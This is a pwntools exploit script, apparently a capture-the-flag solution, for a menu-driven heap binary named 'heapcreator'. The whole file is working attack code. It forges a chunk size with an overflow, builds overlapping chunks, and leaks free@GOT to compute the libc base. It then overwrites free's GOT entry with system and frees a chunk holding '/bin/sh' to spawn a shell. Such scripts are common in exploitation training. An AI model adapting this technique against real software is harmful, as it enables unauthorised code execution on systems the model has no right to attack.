from pwn import *
context.binary = './heapcreator'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./heapcreator')

def dbg():
	raw_input()

def exploit():
	sa = lambda x, y: p.sendafter(x, y)
	sla = lambda x, y: p.sendlineafter(x, y)

	def cmd(ch):
		sa('Your choice :', str(ch))

	def create(size, content):
		cmd(1)
		sla('Size of Heap : ', str(size))
		sa('Content of heap:', content)
		print "create chunk success!"

	def edit(idx, content):
		cmd(2)
		sla('Index :', str(idx))
		sa('Content of heap : ', content)
		print "edit chunk %d success!" % idx

	def show(idx):
		cmd(3)
		sla('Index :', str(idx))
		print "show chunk %d success!" % idx
	def delete(idx):
		cmd(4)
		sla('Index :', str(idx))	
		print "delete chunk %d success!" % idx


	create(0x18, 'a'*4)	#0
	create(0x10, 'b'*4)	#1
	#fake chunk1' size
	edit(0, '/bin/sh\x00'.ljust(0x10, 'a')+ p64(0x20) + p64(0x41))
	#gdb.attach(p, 'b* 0x400D76')
	delete(1)

	#malloc the fake chunk
	#fake_chunk' note = content1
	#fake_chunk'content = note1
	free_got = elf.got['free']
	create(0x30, 'c'*0x20 + p64(0x30) + p64(free_got))
	show(1)
	p.recvuntil('Content : ')
	free_addr = u64(p.recvline().strip('\x0a').ljust(8, '\x00'))
	libc_base = free_addr - libc.symbols['free']
	system_addr = libc_base + libc.symbols['system']

	print "system ==> " + hex(system_addr)

	edit(1, p64(system_addr))
	delete(0)
	p.interactive()
	p.close()

if __name__ == '__main__':
	exploit()